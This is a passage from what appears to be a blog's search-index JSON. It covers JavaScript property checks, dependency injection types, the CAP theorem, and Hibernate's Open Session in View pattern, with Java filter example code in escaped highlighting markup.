每个实例对象都有一个hasOwnProperty()方法，用来判断某一个属性到底是本地属性，还是继承自prototype对象的属性。 　　alert(cat1.hasOwnProperty(&quot;name&quot;)); // true 　　alert(cat1.hasOwnProperty(&quot;type&quot;)); // false 6.3 in运算符 in运算符可以用来判断，某个实例是否含有某个属性，不管是不是本地属性。 　　alert(&quot;name&quot; in cat1); // true 　　alert(&quot;type&quot; in cat1); // true in运算符还可以用来遍历某个对象的所有属性。 　　for(var prop in cat1) { alert(&quot;cat1[&quot;+prop+&quot;]=&quot;+cat1[prop]); } （完） ",
      "url"      : "http://localhost:4000/2017/02/12/iteye-142/"
    } ,
  
    {
      "title"    : "依赖注入方式",
      "category" : "iteye",
      "content": "DI三种注入方式：   构造函数注入   Set方法注入 Spring框架中主要采用的方法   接口注入       比如Struts2 中的action是POJO，如果需要访问http request, response, session, application, servlet context,需要实现相应的Aware接口。 ",
      "url"      : "http://localhost:4000/2017/02/12/iteye-143/"
    } ,
  
    {
      "title"    : "CAP",
      "category" : "iteye",
      "content": "CAP理论   Eric Brewer , systems professor at the University of California, Berkeley, and at that time head of Inktomi, brought the different trade-offs together in a keynote address to the PODC (Principles of Distributed Computing) conference in 2000.1 He presented the CAP theorem, which states that of three properties of shared-data systems—data consistency, system availability, and tolerance to network partition —only two can be achieved at any given time.   Eventually Consistency one of the weak consistency. That is, if no more updates on the given object, accessing the object will always return the last updated value. Of couse, there is a time period between the update and all observers seeing the updated value, which called inconsistency Window.     ",
      "url"      : "http://localhost:4000/2017/02/12/iteye-144/"
    } ,
  
    {
      "title"    : "open session in view",
      "category" : "iteye",
      "content": "摘自：http://community.jboss.org/wiki/OpenSessioninView   问题描述 A common issue in a typical (web-)application is the rendering of the view, after the main logic of the action has been completed, and therefore, the Hibernate Session has already been closed and the database transaction has ended. If you access detached objects that have been loaded in the Session inside your JSP (or any other view rendering mechanism), you might hit an unloaded collection or a proxy that isn't initialized. The exception you get is: LazyInitializationException: Session has been closed (or a very similar message). 比如页面是学生信息显示，学生实体对象包含一个课程实体列表，并且采用惰性装载。那么页面显示学生的课程信息时可能Session已关闭，事务已提交，hibernate会抛出上面的异常。基本上问题出现在一次request 与 response 之间layz loading的对象上。 open session in view解决方案也是应用在相应的scope内。如果是用JPA，那么对应Session的是EntityManager，相应的是open entity manager in view. 如果渲染发生在servlet中，在servlet中打开和关闭Session（Session per Request), 这样是没问题的。但如果渲染是用JSP，那么就有这里所说的问题，这时就需要Open Session in View的filter方式。Filter后处理发生在 “渲染JSP模板生成Html” 后， 这时候才关闭Session或者EntityManager   解决方案 为detached objects 重新开一个session   open session in view in most applications you need the following: when an HTTP request has to be handled, a new Session and database transaction will begin. Right before the response is send to the client, and after all the work has been done, the transaction will be committed, and the Session will be closed. A good standard interceptor in a servlet container is a ServletFilter . public class HibernateSessionRequestFilter implements Filter { &lt;span class=&quot;kd&quot;&gt;private&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Log&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;log&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;LogFactory&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getLog&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;HibernateSessionRequestFilter&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;private&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;SessionFactory&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sf&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;doFilter&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;ServletRequest&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;request&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt;    &lt;span class=&quot;nc&quot;&gt;ServletResponse&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;response&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt;    &lt;span class=&quot;nc&quot;&gt;FilterChain&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;chain&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;  &lt;span class=&quot;kd&quot;&gt;throws&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;IOException&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;ServletException&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;try&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;debug&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Starting a database transaction&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;sf&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getCurrentSession&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;beginTransaction&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;  &lt;span class=&quot;c1&quot;&gt;// Call the next filter (continue request processing)&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;chain&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;doFilter&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;request&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;response&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;  &lt;span class=&quot;c1&quot;&gt;// Commit and cleanup&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;debug&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Committing the database transaction&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;sf&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getCurrentSession&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getTransaction&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;commit&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;catch&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;StaleObjectStateException&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;staleEx&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;error&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;This interceptor does not implement optimistic concurrency control!&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;error&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Your application will not work until you add compensation actions!&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;  &lt;span class=&quot;c1&quot;&gt;// Rollback, close everything, possibly compensate for any permanent changes&lt;/span&gt;  &lt;span class=&quot;c1&quot;&gt;// during the conversation, and finally restart business conversation. Maybe&lt;/span&gt;  &lt;span class=&quot;c1&quot;&gt;// give the user of the application a chance to merge some of his work with&lt;/span&gt;  &lt;span class=&quot;c1&quot;&gt;// fresh data... what you do here depends on your applications design.&lt;/span&gt;  &lt;span class=&quot;k&quot;&gt;throw&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;staleEx&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;catch&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;Throwable&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ex&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;  &lt;span class=&quot;c1&quot;&gt;// Rollback only&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;ex&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;printStackTrace&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;  &lt;span class=&quot;k&quot;&gt;try&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;   &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sf&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getCurrentSession&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getTransaction&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;isActive&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;())&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;debug&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Trying to rollback database transaction after exception&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;sf&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getCurrentSession&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getTransaction&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;rollback&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;   &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;catch&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;Throwable&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rbEx&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;   &lt;span class=&quot;n&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;error&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Could not rollback transaction after exception!&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rbEx&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;  &lt;span class=&quot;c1&quot;&gt;// Let others handle it... maybe another interceptor for exceptions?&lt;/span&gt;  &lt;span class=&quot;k&quot;&gt;throw&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;ServletException&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ex&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;init&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;FilterConfig&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;filterConfig&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;throws&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;ServletException&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;debug&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Initializing filter...&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;debug&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Obtaining SessionFactory from static HibernateUtil singleton&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;sf&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;HibernateUtil&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getSessionFactory&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;destroy&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{}&lt;/span&gt; }   &lt;filter&gt;  &lt;filter-name&gt;HibernateFilter&lt;/filter-name&gt;  &lt;filter-class&gt;my.package.HibernateSessionRequestFilter&lt;/filter-class&gt;  &lt;/filter&gt; &lt;span class=&quot;nt&quot;&gt;&amp;lt;filter-mapping&amp;gt;&lt;/span&gt;  &lt;span class=&quot;nt&quot;&gt;&amp;lt;filter-name&amp;gt;&lt;/span&gt;HibernateFilter&lt;span class=&quot;nt&quot;&gt;&amp;lt;/filter-name&amp;gt;&lt;/span&gt;  &lt;span class=&quot;nt&quot;&gt;&amp;lt;url-pattern&amp;gt;&lt;/span&gt;/*&lt;span class=&quot;nt&quot;&gt;&amp;lt;/url-pattern&amp;gt;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;&amp;lt;/filter-mapping&amp;gt;&lt;/span&gt;   public class ItemDAO { &lt;span class=&quot;nc&quot;&gt;Session&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;currentSession&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;ItemDAO&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;currentSession&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;HibernateUtil&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getSessionFactory&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getCurrentSession&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Item&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;getItemById&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;Long&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;itemId&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;  &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;Item&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;currentSession&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;load&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;Item&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;itemId&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; } public String execute(HttpRequest request) { &lt;span class=&quot;nc&quot;&gt;Long&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;itemId&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;request&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getParameter&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;ITEM_ID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;ItemDAO&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;dao&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;ItemDAO&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;request&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;setAttribute&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;RESULT&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;dao&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getItemById&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;itemId&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;success&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt; } filter for long conversation 长事务  If you'd like to use a single Session for several database transactions, you either have to implement it completely yourself, or you have to use the built-in &quot;application managed&quot; strategy:       To enable the application-managed &quot;current&quot; Session strategy, set your hibernate.current_session_context_class configuration property to org.hibernate.context.ManagedSessionContext (or simply &quot;managed&quot; in Hibernate 3.2). You can now bind and unbind the &quot;current&quot; Session with static methods, and control the FlushMode and flushing manually.   public class HibernateSessionConversationFilter  implements Filter { &lt;span class=&quot;kd&quot;&gt;private&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Log&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;log&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;LogFactory&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getLog&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;HibernateSessionConversationFilter&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;private&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;SessionFactory&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sf&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;final&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;HIBERNATE_SESSION_KEY&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;hibernateSession&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;final&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;END_OF_CONVERSATION_FLAG&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;endOfConversation&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;doFilter&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;ServletRequest&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;request&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt;    &lt;span class=&quot;nc&quot;&gt;ServletResponse&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;response&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt;    &lt;span class=&quot;nc&quot;&gt;FilterChain&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;chain&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;  &lt;span class=&quot;kd&quot;&gt;throws&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;IOException&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;ServletException&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;org&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;hibernate&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;classic&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;Session&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;currentSession&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// Try to get a Hibernate Session from the HttpSession&lt;/span&gt;  &lt;span class=&quot;nc&quot;&gt;HttpSession&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;httpSession&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;   &lt;span class=&quot;o&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;HttpServletRequest&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;request&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getSession&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;  &lt;span class=&quot;nc&quot;&gt;Session&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;disconnectedSession&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;   &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;Session&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;httpSession&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getAttribute&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;HIBERNATE_SESSION_KEY&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;try&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;  &lt;span class=&quot;c1&quot;&gt;// Start a new conversation or in the middle?&lt;/span&gt;  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;disconnectedSession&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;   &lt;span class=&quot;n&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;debug&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&amp;gt;&amp;gt;&amp;gt; New conversation&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;   &lt;span class=&quot;n&quot;&gt;currentSession&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sf&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;openSession&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;   &lt;span class=&quot;n&quot;&gt;currentSession&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;setFlushMode&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;FlushMode&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;NEVER&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;   &lt;span class=&quot;n&quot;&gt;log&lt;/span&gt;&lt;span 